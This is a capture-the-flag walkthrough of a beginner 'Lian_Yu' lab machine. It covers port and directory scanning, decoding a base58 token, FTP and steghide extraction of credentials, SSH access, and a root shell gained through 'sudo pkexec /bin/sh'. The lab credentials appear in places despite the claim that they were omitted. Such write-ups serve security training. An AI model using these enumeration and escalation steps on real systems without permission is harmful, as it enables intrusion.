## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
A beginner level security challenge
```

## RustScan 
```bash
$ rustscan -a 10.201.101.39  -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80

[~] Automatically increasing ulimit value to 5000.
Open 10.201.101.39:22
Open 10.201.101.39:21
Open 10.201.101.39:80
Open 10.201.101.39:111
Open 10.201.101.39:39600
```

## Feroxbuster
```bash
$ feroxbuster -u http://10.201.101.39:80 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt

                                                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.201.101.39:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       59l      358w     2506c http://10.201.101.39/
301      GET        7l       20w      236c http://10.201.101.39/island => http://10.201.101.39/island/
200      GET       24l       49w      345c http://10.201.101.39/island/
301      GET        7l       20w      241c http://10.201.101.39/island/2100 => http://10.201.101.39/island/2100/
200      GET       16l       35w      292c http://10.201.101.39/island/2100/
[####################] - 6m    172039/172039  0s      found:5       errors:160    
[####################] - 4m     43008/43008   168/s   http://10.201.101.39:80/ 
[####################] - 4m     43008/43008   168/s   http://10.201.101.39/ 
[####################] - 4m     43008/43008   165/s   http://10.201.101.39/island/ 
[####################] - 4m     43008/43008   173/s   http://10.201.101.39/island/2100/                                                  
```

## Directories Found
```Directory
Island
Island/2100
```
## Directory Island
```html
<!DOCTYPE html>
<html>
<body>
<style>
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>
<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
</body>
</html>
```

## Hidden Keyword
```Keyword
vigilante
```

## Directory Island/2100
```html
<!DOCTYPE html>
<html>
<body>
<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>
<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->
</header>
</body>
</html>
```

## Nmap 
```bash
$ nmap -sC -sV -p21,22,80,111,39600 10.201.101.39
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 04:09 EDT
Nmap scan report for 10.201.101.39
Host is up (0.24s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33479/udp6  status
|   100024  1          33635/tcp6  status
|   100024  1          39600/tcp   status
|_  100024  1          42132/udp   status
39600/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.66 seconds

$ nmap -sV -p 111,39600 --script=rpcinfo,rpc-grind 10.201.101.39

PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33479/udp6  status
|   100024  1          33635/tcp6  status
|   100024  1          39600/tcp   status
|_  100024  1          42132/udp   status
39600/tcp open  status  1 (RPC #100024)
```

## Gobuster
```bash
$ gobuster dir -u http://10.201.101.39/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.101.39/island/2100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
```

Got The Ticket
```bash
/green_arrow.ticket 
```

## Ticket Content
```html
This is just a token to get into Queen's Gambit(Ship)
RTy8yhBQdscX
```

This is a Cipher text which is actually is written in `base58` which is concluded
```cipher
RTy8yhBQdscX = !#th3h00d
```

## FTP
```bash
$ ftp 10.201.127.4 
Connected to 10.201.127.4.
220 (vsFTPd 3.0.2)
Name (10.201.127.4:kali): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||49229|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> get Queen's_Gambit.png
local: Queen's_Gambit.png remote: Queen's_Gambit.png
229 Entering Extended Passive Mode (|||50474|).
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
100% |*******************************************************************|   537 KiB   46.83 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:11 (44.83 KiB/s)
ftp> get Leave_me_alone.png
local: Leave_me_alone.png remote: Leave_me_alone.png

229 Entering Extended Passive Mode (|||59308|).
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
100% |*******************************************************************|   499 KiB   44.46 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:11 (43.26 KiB/s)
ftp> 
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
229 Entering Extended Passive Mode (|||60480|).
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |*******************************************************************|   186 KiB   57.47 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:03 (52.54 KiB/s)
```

## Files
```bash
└─$ file Queen\'s_Gambit.png 
Queen's_Gambit.png: PNG image data, 1280 x 720, 8-bit/color RGBA, non-interlaced
┌──(kali㉿kali)-[~]
└─$ file Leave_me_alone.png 
Leave_me_alone.png: data
┌──(kali㉿kali)-[~]
└─$ file aa.jpg            
aa.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1200x1600, components 3
```
 Got The Files and only `Queen` File is where nothing is suspicious 
 Rest of the files are changed and steghide
 so lets extract it 
 ```bash
 $ python3 - <<'PY'
from pathlib import Path
p = Path("Leave_me_alone.png").read_bytes()
sig = b'\x89PNG\r\n\x1a\n'
Path("Leave_fixed.png").write_bytes(sig + p[8:])
print("wrote Leave_fixed.png")
PY

wrote Leave_fixed.png
 ```
 This Python Code is used to fix the file magic header `Leave_me_alone.png`
 then which show is the text 
 ```Message
 just leave me a lone
 Here take it what you want 
 Password
 ```
 which is used to extract data from the file aa.jpg
 ```bash
$ steghide extract -sf aa.jpg
Enter passphrase: Password
wrote extracted data to "ss.zip".

┌──(kali㉿kali)-[~]
└─$ unzip ss.zip 
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado
 ```
 Then We Got another message in file passwd.txt
 ```Message
 $ cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***
a small Note about it
Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

┌──(kali㉿kali)-[~]
└─$ cat shado 
M3tahuman
 ```

Where suspecting `M3tahuman` is the `SSH` password for any user
```bash
$ ssh slade@10.201.127.4
slade@10.201.127.4's password: [password omitted]
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

```

Got the Access

## USER Flag
```bash
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
[flag omitted]
                        --Felicity Smoak
```

## Privilege Escalation
```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: [password omitted]
slade@LianYu:~$ 
```

Lets go for the pkexec
```bash
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/sh -c 'id; /bin/bash -i'
uid=0(root) gid=0(root) groups=0(root)
root@LianYu:~# 
```

## Root Flag
```bash
root@LianYu:~# ls
root.txt
root@LianYu:~# cat root.txt 
Mission accomplished
You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
[flag omitted]                                      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

```